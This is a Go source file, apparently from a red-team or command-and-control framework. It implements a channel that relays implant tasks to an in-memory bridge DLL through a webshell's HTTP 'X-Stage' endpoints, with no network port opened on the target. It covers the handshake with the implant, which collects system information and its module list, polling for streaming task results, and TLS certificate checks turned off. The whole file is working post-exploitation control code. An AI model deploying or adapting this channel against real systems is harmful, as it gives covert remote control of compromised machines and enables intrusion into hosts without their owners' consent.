package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chainreactors/IoM-go/proto/client/clientpb"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/chainreactors/logs"
	"google.golang.org/protobuf/proto"
)

const (
	httpTimeout     = 30 * time.Second
	pollInterval    = 500 * time.Millisecond
	streamChanBuffer = 16
	stageInit       = "init"
	stageSpite      = "spite"
	stageStatus     = "status"
	headerStage     = "X-Stage"
	headerToken     = "X-Token"
	headerSessionID = "X-Session-ID"
)

// ChannelIface abstracts the communication channel to the bridge DLL.
type ChannelIface interface {
	Connect(ctx context.Context) error
	Handshake() (*implantpb.Register, error)
	StartRecvLoop()
	Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error)
	OpenStream(taskID uint32) <-chan *implantpb.Spite
	SendSpite(taskID uint32, spite *implantpb.Spite) error
	CloseStream(taskID uint32)
	CloseAllStreams()
	WithSecure(keyPair *clientpb.KeyPair)
	Close() error
	SessionID() uint32
	IsClosed() bool
}

// Channel communicates with the bridge DLL through HTTP POST requests
// to the webshell's X-Stage endpoints. The webshell calls DLL exports
// (bridge_init, bridge_process) directly via function pointers — no TCP
// port opened on the target, pure memory channel.
//
// Wire format: raw protobuf over HTTP body.
//
// For streaming tasks, a background poll goroutine periodically sends
// empty requests to collect pending responses from the DLL.
type Channel struct {
	webshellURL string
	token       string
	client      *http.Client

	sid    uint32
	sidSet atomic.Bool
	closed atomic.Bool
	closeCh chan struct{}

	pendMu  sync.Mutex
	pending map[uint32]chan *implantpb.Spite

	pollCancel context.CancelFunc
}

// NewChannel creates a channel that communicates with the DLL through
// the webshell's X-Stage: spite HTTP endpoint.
func NewChannel(webshellURL, token string) *Channel {
	return &Channel{
		webshellURL: webshellURL,
		token:       token,
		client: &http.Client{
			Timeout: httpTimeout,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
		pending: make(map[uint32]chan *implantpb.Spite),
		closeCh: make(chan struct{}),
	}
}

// Connect verifies the webshell is reachable and the DLL is loaded.
func (c *Channel) Connect(ctx context.Context) error {
	body, err := c.doRequest(ctx, stageStatus, nil)
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	status := string(body)
	if status != "LOADED" {
		return fmt.Errorf("DLL not loaded (status: %s)", status)
	}
	return nil
}

// Handshake calls bridge_init on the DLL via the webshell and returns
// the Register message containing SysInfo and module list.
func (c *Channel) Handshake() (*implantpb.Register, error) {
	body, err := c.doRequest(context.Background(), stageInit, nil)
	if err != nil {
		return nil, fmt.Errorf("handshake: %w", err)
	}
	if len(body) == 0 {
		return nil, fmt.Errorf("empty handshake response")
	}

	// First 4 bytes: session ID (little-endian uint32), rest: Register protobuf
	if len(body) < 4 {
		return nil, fmt.Errorf("handshake response too short: %d bytes", len(body))
	}
	c.sid = uint32(body[0]) | uint32(body[1])<<8 | uint32(body[2])<<16 | uint32(body[3])<<24
	c.sidSet.Store(true)

	reg := &implantpb.Register{}
	if err := proto.Unmarshal(body[4:], reg); err != nil {
		return nil, fmt.Errorf("unmarshal register: %w", err)
	}

	logs.Log.Debugf("handshake: sid=%d name=%s modules=%v", c.sid, reg.Name, reg.Module)
	return reg, nil
}

// StartRecvLoop starts a background polling goroutine that fetches pending
// responses from the DLL for streaming tasks.
func (c *Channel) StartRecvLoop() {
	ctx, cancel := context.WithCancel(context.Background())
	c.pollCancel = cancel
	go c.pollLoop(ctx)
}

func (c *Channel) pollLoop(ctx context.Context) {
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-c.closeCh:
			return
		case <-ticker.C:
			c.pendMu.Lock()
			hasPending := len(c.pending) > 0
			c.pendMu.Unlock()
			if !hasPending {
				continue
			}

			empty := &implantpb.Spites{}
			data, err := proto.Marshal(empty)
			if err != nil {
				continue
			}
			respBody, err := c.doRequest(ctx, stageSpite, data)
			if err != nil {
				if ctx.Err() != nil {
					return
				}
				logs.Log.Debugf("poll error: %v", err)
				continue
			}
			c.dispatchResponse(respBody)
		}
	}
}

// Forward sends a Spite and waits for a single response (unary request-response).
func (c *Channel) Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error) {
	if c.closed.Load() {
		return nil, fmt.Errorf("channel closed")
	}

	spite.TaskId = taskID
	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
	data, err := proto.Marshal(spites)
	if err != nil {
		return nil, fmt.Errorf("marshal spite: %w", err)
	}

	respBody, err := c.doRequest(context.Background(), stageSpite, data)
	if err != nil {
		return nil, fmt.Errorf("forward: %w", err)
	}

	respSpites := &implantpb.Spites{}
	if err := proto.Unmarshal(respBody, respSpites); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}

	for _, s := range respSpites.GetSpites() {
		if s.GetTaskId() == taskID {
			return s, nil
		}
	}

	if len(respSpites.GetSpites()) > 0 {
		for _, s := range respSpites.GetSpites() {
			c.dispatchSpite(s)
		}
	}

	return nil, fmt.Errorf("no response for task %d", taskID)
}

// OpenStream registers a persistent response channel for streaming tasks.
func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
	ch := make(chan *implantpb.Spite, streamChanBuffer)
	c.pendMu.Lock()
	c.pending[taskID] = ch
	c.pendMu.Unlock()
	return ch
}

// SendSpite sends a spite to the DLL via the webshell.
func (c *Channel) SendSpite(taskID uint32, spite *implantpb.Spite) error {
	if c.closed.Load() {
		return fmt.Errorf("channel closed")
	}

	spite.TaskId = taskID
	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
	data, err := proto.Marshal(spites)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	respBody, err := c.doRequest(context.Background(), stageSpite, data)
	if err != nil {
		return err
	}

	c.dispatchResponse(respBody)
	return nil
}

func (c *Channel) CloseStream(taskID uint32) {
	c.pendMu.Lock()
	delete(c.pending, taskID)
	c.pendMu.Unlock()
}

func (c *Channel) CloseAllStreams() {
	c.pendMu.Lock()
	for id, ch := range c.pending {
		close(ch)
		delete(c.pending, id)
	}
	c.pendMu.Unlock()
}

func (c *Channel) SessionID() uint32 { return c.sid }

func (c *Channel) IsClosed() bool { return c.closed.Load() }

// WithSecure is a no-op. Use HTTPS for transport security.
func (c *Channel) WithSecure(_ *clientpb.KeyPair) {}

func (c *Channel) Close() error {
	if c.closed.Swap(true) {
		return nil
	}
	close(c.closeCh)
	if c.pollCancel != nil {
		c.pollCancel()
	}
	c.CloseAllStreams()
	return nil
}

func (c *Channel) doRequest(ctx context.Context, stage string, body []byte) ([]byte, error) {
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}

	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bodyReader)
	if err != nil {
		return nil, err
	}
	req.Header.Set(headerStage, stage)
	if c.token != "" {
		req.Header.Set(headerToken, c.token)
	}
	if c.sidSet.Load() {
		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
	}

	return io.ReadAll(resp.Body)
}

func (c *Channel) dispatchResponse(body []byte) {
	if len(body) == 0 {
		return
	}
	spites := &implantpb.Spites{}
	if err := proto.Unmarshal(body, spites); err != nil {
		logs.Log.Debugf("dispatch unmarshal error: %v", err)
		return
	}
	for _, spite := range spites.GetSpites() {
		c.dispatchSpite(spite)
	}
}

func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
	taskID := spite.GetTaskId()
	c.pendMu.Lock()
	ch, ok := c.pending[taskID]
	c.pendMu.Unlock()
	if ok {
		select {
		case ch <- spite:
		default:
			logs.Log.Debugf("channel: pending full for task %d", taskID)
		}
	}
}
